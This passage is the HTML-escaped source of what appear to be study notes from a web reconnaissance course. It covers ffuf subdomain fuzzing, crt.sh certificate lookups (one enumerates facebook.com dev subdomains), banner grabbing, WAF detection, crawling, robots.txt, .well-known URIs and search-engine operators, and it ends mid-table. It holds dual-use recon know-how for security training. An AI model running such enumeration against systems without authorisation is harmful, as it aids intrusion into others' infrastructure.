Progress: 114441 / 114442 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;#ffuf #subdomain&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://inlanefreight.htb:57580&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Host: FUZZ.inlanefreight.htb:57580&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /home/nullbyte/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  -fs 116

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;certificate-transparency-logs&quot;&gt;Certificate Transparency Logs&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;In the sprawling mass of the internet, trust is a fragile commodity. One of the cornerstones of this trust is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Secure Sockets Layer/Transport Layer Security&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL/TLS&lt;/code&gt;) protocol, which encrypts communication between your browser and a website. At the heart of SSL/TLS lies the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;digital certificate&lt;/code&gt;, a small file that verifies a website’s identity and allows for secure, encrypted communication.&lt;/p&gt;

&lt;p&gt;However, the process of issuing and managing these certificates isn’t foolproof. Attackers can exploit rogue or mis-issued certificates to impersonate legitimate websites, intercept sensitive data, or spread malware. This is where Certificate Transparency (CT) logs come into play.&lt;/p&gt;

&lt;p&gt;Certificate Transparency (CT) logs are public, append-only ledgers that record the issuance of SSL/TLS certificates. Whenever a Certificate Authority (CA) issues a new certificate, it must submit it to multiple CT logs. Independent organisations maintain these logs and are open for anyone to inspect.&lt;/p&gt;

&lt;p&gt;Think of CT logs as a global registry of certificates. They provide a transparent and verifiable record of every SSL/TLS certificate issued for a website. This transparency serves several crucial purposes:&lt;/p&gt;

&lt;h3 id=&quot;crtsh-lookup&quot;&gt;Crt.sh lookup&lt;/h3&gt;

&lt;p&gt;While &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crt.sh&lt;/code&gt; offers a convenient web interface, you can also leverage its API for automated searches directly from your terminal. Let’s see how to find all ‘dev’ subdomains on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;facebook.com&lt;/code&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jq&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://crt.sh/?q=facebook.com&amp;amp;output=json&quot;&lt;/span&gt; | jq &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.[] | select(.name_value | contains(&quot;dev&quot;)) | .name_value&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.dev.facebook.com  
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.newdev.facebook.com  
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.secure.dev.facebook.com  
dev.facebook.com  
devvm1958.ftw3.facebook.com  
facebook-amex-dev.facebook.com  
facebook-amex-sign-enc-dev.facebook.com  
newdev.facebook.com  
secure.dev.facebook.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;fingerprinting-techniques&quot;&gt;Fingerprinting Techniques&lt;/h2&gt;

&lt;p&gt;There are several techniques used for web server and technology fingerprinting:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Banner Grabbing&lt;/code&gt;: Banner grabbing involves analysing the banners presented by web servers and other services. These banners often reveal the server software, version numbers, and other details.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Analysing HTTP Headers&lt;/code&gt;: HTTP headers transmitted with every web page request and response contain a wealth of information. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server&lt;/code&gt; header typically discloses the web server software, while the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Powered-By&lt;/code&gt; header might reveal additional technologies like scripting languages or frameworks.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Probing for Specific Responses&lt;/code&gt;: Sending specially crafted requests to the target can elicit unique responses that reveal specific technologies or versions. For example, certain error messages or behaviours are characteristic of particular web servers or software components.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Analysing Page Content&lt;/code&gt;: A web page’s content, including its structure, scripts, and other elements, can often provide clues about the underlying technologies. There may be a copyright header that indicates specific software being used, for example.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A variety of tools exist that automate the fingerprinting process, combining various techniques to identify web servers, operating systems, content management systems, and other technologies:&lt;/p&gt;

&lt;p&gt;| Tool         | Description                                                                                                           | Features                                                                                            |
| ———— | ——————————————————————————————————————— | ————————————————————————————————— |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wappalyzer&lt;/code&gt; | Browser extension and online service for website technology profiling.                                                | Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BuiltWith&lt;/code&gt;  | Web technology profiler that provides detailed reports on a website’s technology stack.                               | Offers both free and paid plans with varying levels of detail.                                      |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;    | Command-line tool for website fingerprinting.                                                                         | Uses a vast database of signatures to identify various web technologies.                            |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt;       | Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. | Can be used with scripts (NSE) to perform more specialised fingerprinting.                          |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcraft&lt;/code&gt;   | Offers a range of web security services, including website fingerprinting and security reporting.                     | Provides detailed reports on a website’s technology, hosting provider, and security posture.        |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wafw00f&lt;/code&gt;    | Command-line tool specifically designed for identifying Web Application Firewalls (WAFs).                             | Helps determine if a WAF is present and, if so, its type and configuration.                         |&lt;/p&gt;
&lt;h3 id=&quot;banner-grabbing&quot;&gt;Banner Grabbing&lt;/h3&gt;

&lt;p&gt;Our first step is to gather information directly from the web server itself. We can do this using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; command with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-I&lt;/code&gt; flag (or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--head&lt;/code&gt;) to fetch only the HTTP headers, not the entire page content.&lt;/p&gt;

&lt;p&gt;Fingerprinting&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; inlanefreight.com


HTTP/1.1 301 Moved Permanently
Date: Fri, 31 May 2024 12:07:44 GMT
Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Location: https://inlanefreight.com/
Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;wafw00f&quot;&gt;Wafw00f&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web Application Firewalls&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WAFs&lt;/code&gt;) are security solutions designed to protect web applications from various attacks. Before proceeding with further fingerprinting, it’s crucial to determine if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inlanefreight.com&lt;/code&gt; employs a WAF, as it could interfere with our probes or potentially block our requests.&lt;/p&gt;

&lt;p&gt;To detect the presence of a WAF, we’ll use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wafw00f&lt;/code&gt; tool. To install &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wafw00f&lt;/code&gt;, you can use pip3:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pip3 &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;git+https://github.com/EnableSecurity/wafw00f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;crawling&quot;&gt;Crawling&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crawling&lt;/code&gt;, often called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spidering&lt;/code&gt;, is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automated process of systematically browsing the World Wide Web&lt;/code&gt;. Similar to how a spider navigates its web, a web crawler follows links from one page to another, collecting information. These crawlers are essentially bots that use pre-defined algorithms to discover and index web pages, making them accessible through search engines or for other purposes like data analysis and web reconnaissance.&lt;/p&gt;

&lt;h2 id=&quot;how-web-crawlers-work&quot;&gt;How Web Crawlers Work&lt;/h2&gt;

&lt;p&gt;The basic operation of a web crawler is straightforward yet powerful. It starts with a seed URL, which is the initial web page to crawl. The crawler fetches this page, parses its content, and extracts all its links. It then adds these links to a queue and crawls them, repeating the process iteratively. Depending on its scope and configuration, the crawler can explore an entire website or even a vast portion of the web.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Homepage&lt;/code&gt;: You start with the homepage containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link2&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link3&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;robotstxt&quot;&gt;robots.txt&lt;/h1&gt;

&lt;p&gt;Imagine you’re a guest at a grand house party. While you’re free to mingle and explore, there might be certain rooms marked “Private” that you’re expected to avoid. This is akin to how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; functions in the world of web crawling. It acts as a virtual “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etiquette guide&lt;/code&gt;” for bots, outlining which areas of a website they are allowed to access and which are off-limits.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Disallow: /private/

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Disallow: /admin/
Disallow: /private/
Allow: /public/

User-agent: Googlebot
Crawl-delay: 10

Sitemap: https://www.example.com/sitemap.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This file contains the following directives:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;All user agents are disallowed from accessing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/private/&lt;/code&gt; directories.&lt;/li&gt;
  &lt;li&gt;All user agents are allowed to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/public/&lt;/code&gt; directory.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Googlebot&lt;/code&gt; (Google’s web crawler) is specifically instructed to wait 10 seconds between requests.&lt;/li&gt;
  &lt;li&gt;The sitemap, located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://www.example.com/sitemap.xml&lt;/code&gt;, is provided for easier crawling and indexing.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By analyzing this robots.txt, we can infer that the website likely has an admin panel located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; and some private content in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/private/&lt;/code&gt; directory.&lt;/p&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;well-known-uris&quot;&gt;Well-Known URIs&lt;/h1&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.well-known&lt;/code&gt; standard, defined in &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc8615&quot;&gt;RFC 8615&lt;/a&gt;, serves as a standardized directory within a website’s root domain. This designated location, typically accessible via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/.well-known/&lt;/code&gt; path on a web server, centralizes a website’s critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.&lt;/p&gt;

&lt;p&gt;By establishing a consistent location for such data, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.well-known&lt;/code&gt; simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website’s security policy, a client would request &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://example.com/.well-known/security.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Internet Assigned Numbers Authority&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IANA&lt;/code&gt;) maintains a &lt;a href=&quot;https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml&quot;&gt;registry&lt;/a&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.well-known&lt;/code&gt; URIs, each serving a specific purpose defined by various specifications and standards. Below is a table highlighting a few notable examples:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;URI Suffix&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
      &lt;th&gt;Status&lt;/th&gt;
      &lt;th&gt;Reference&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.txt&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Contains contact information for security researchers to report vulnerabilities.&lt;/td&gt;
      &lt;td&gt;Permanent&lt;/td&gt;
      &lt;td&gt;RFC 9116&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/.well-known/change-password&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Provides a standard URL for directing users to a password change page.&lt;/td&gt;
      &lt;td&gt;Provisional&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openid-configuration&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol.&lt;/td&gt;
      &lt;td&gt;Permanent&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assetlinks.json&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Used for verifying ownership of digital assets (e.g., apps) associated with a domain.&lt;/td&gt;
      &lt;td&gt;Permanent&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mta-sts.txt&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.&lt;/td&gt;
      &lt;td&gt;Permanent&lt;/td&gt;
      &lt;td&gt;RFC 8461&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;creepy-crawlies&quot;&gt;Creepy Crawlies&lt;/h1&gt;

&lt;p&gt;Web crawling is vast and intricate, but you don’t have to embark on this journey alone. A plethora of web crawling tools are available to assist you, each with its own strengths and specialties. These tools automate the crawling process, making it faster and more efficient, allowing you to focus on analyzing the extracted data.&lt;/p&gt;

&lt;h2 id=&quot;popular-web-crawlers&quot;&gt;Popular Web Crawlers&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite Spider&lt;/code&gt;: Burp Suite, a widely used web application testing platform, includes a powerful active crawler called Spider.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OWASP ZAP (Zed Attack Proxy)&lt;/code&gt;: ZAP is a free, open-source web application security scanner. It can be used in automated and manual modes and includes a spider component to crawl web applications and identify potential vulnerabilities.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Scrapy (Python Framework)&lt;/code&gt;: Scrapy is a versatile and scalable Python framework for building custom web crawlers.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache Nutch (Scalable Crawler)&lt;/code&gt;: Nutch is a highly extensible and scalable open-source web crawler written in Java. It’s designed to handle massive crawls across the entire web or focus on specific domains.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Adhering to ethical and responsible crawling practices is crucial no matter which tool you choose. Always obtain permission before crawling a website, especially if you plan to perform extensive or intrusive scans. Be mindful of the website’s server resources and avoid overloading them with excessive requests.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;search-engine-discovery&quot;&gt;Search Engine Discovery&lt;/h1&gt;

&lt;p&gt;Search engines serve as our guides in the vast landscape of the internet, helping us navigate through the seemingly endless expanse of information. However, beyond their primary function of answering everyday queries, search engines also hold a treasure trove of data that can be invaluable for web reconnaissance and information gathering. This practice, known as search engine discovery or OSINT (Open Source Intelligence) gathering, involves using search engines as powerful tools to uncover information about target websites, organisations, and individuals.&lt;/p&gt;

&lt;h2 id=&quot;search-operators&quot;&gt;Search Operators&lt;/h2&gt;

&lt;p&gt;Search operators are like search engines’ secret codes. These special commands and modifiers unlock a new level of precision and control, allowing you to pinpoint specific types of information amidst the vastness of the indexed web.&lt;/p&gt;

&lt;p&gt;While the exact syntax may vary slightly between search engines, the underlying principles remain consistent. Let’s delve into some essential and advanced search operators:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Operator&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Operator Description&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Example&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Example Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Limits results to a specific website or domain.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Find all publicly accessible pages on example.com.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inurl:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds pages with a specific term in the URL.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inurl:login&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search for login pages on any website.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filetype:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Searches for files of a particular type.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filetype:pdf&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Find downloadable PDF documents.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intitle:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds pages with a specific term in the title.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intitle:&quot;confidential report&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Look for documents titled “confidential report” or similar variations.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intext:&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inbody:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Searches for a term within the body text of pages.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intext:&quot;password reset&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Identify webpages containing the term “password reset”.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cache:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Displays the cached version of a webpage (if available).&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cache:example.com&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;View the cached version of example.com to see its previous content.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds pages that link to a specific webpage.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link:example.com&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Identify websites linking to example.com.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;related:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds websites related to a specific webpage.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;related:example.com&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Discover websites similar to example.com.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Provides a summary of information about a webpage.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info:example.com&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Get basic details about example.com, such as its title and description.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;define:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Provides definitions of a word or phrase.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;define:phishing&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Get a definition of “phishing” from various sources.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;numrange:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Searches for numbers within a specific range.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com numrange:1000-2000&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Find pages on example.com containing numbers between 1000 and 2000.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allintext:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds pages containing all specified words in the body text.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allintext:admin password reset&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search for pages containing both “admin” and “password reset” in the body text.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allinurl:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds pages containing all specified words in the URL.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allinurl:admin panel&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Look for pages with “admin” and “panel” in the URL.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allintitle:&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds pages containing all specified words in the title.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allintitle:confidential report 2023&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search for pages with “confidential,” “report,” and “2023” in the title.&lt;/td&gt;
